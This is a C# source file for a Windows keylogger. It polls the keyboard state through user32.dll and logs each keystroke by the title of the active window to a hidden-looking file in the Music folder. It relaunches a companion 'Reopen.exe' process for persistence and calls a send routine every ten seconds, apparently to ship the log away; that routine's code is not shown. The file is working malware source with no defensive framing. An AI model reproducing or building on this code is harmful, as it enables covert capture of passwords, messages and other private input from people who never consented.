using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {
        private static int i;

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static SendFile sendFile = new SendFile();

        [STAThread]
        static void Main()
        {
            string CreateText = "";
            Lists list = new Lists();
            SetTimer();
            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);
            //Application.Run(new Form1());

            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            filePath = filePath + @"\LogsFolder\";

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (@filePath + "keylogger.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (true)
            {
                if (!GetProcess())
                {
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Local\Keylogger\Reopen.exe");
                    //Console.WriteLine(@Environment.SpecialFolder.ApplicationData + "/Local/Keylogger/Reopen.exe");
                }

                Thread.Sleep(10);
                for (int i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        File.WriteAllText(path, String.Empty);
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            var Title = GetActiveWindowTitle();
                            var instance = list.IsListExisting(Title);

                            if (instance != null)
                            {
                                instance.AddText(text);
                            }
                            else
                            {
                                list.InstanceList.Add(new Instance(Title));
                            }
                            sw.WriteLine(list.CreateString());
                        }
                    }
                }
            }
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            return GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
        }

        private static bool GetProcess()
        {
            Process[] pname = Process.GetProcessesByName("Reopen");
            if (pname.Length == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        private static void SetTimer()
        {
            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 10000;
            timer.Elapsed += timer_Elapsed;
            timer.Start();
        }

        static void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            sendFile.SendKeyFile(500);
        }

    }
}
